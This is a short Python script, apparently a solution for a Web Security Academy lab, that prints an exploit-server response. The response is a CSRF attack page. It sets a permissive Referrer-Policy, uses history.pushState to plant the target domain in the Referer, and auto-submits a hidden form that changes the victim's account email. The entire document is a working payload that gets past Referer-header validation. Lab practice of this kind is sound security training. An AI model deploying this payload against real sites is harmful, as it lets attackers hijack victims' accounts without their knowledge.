LAB_ID = "???"

print("Head:")
print("""
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
""")
print("Body:")
print(f"""
<html>
<body>
<form action="https://{LAB_ID}.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="wiener@evil-user.net" />
</form>
<script>
    history.pushState("", "", "/?{LAB_ID}.web-security-academy.net")
    document.forms[0].submit();
</script>
</body>
</html>
""")
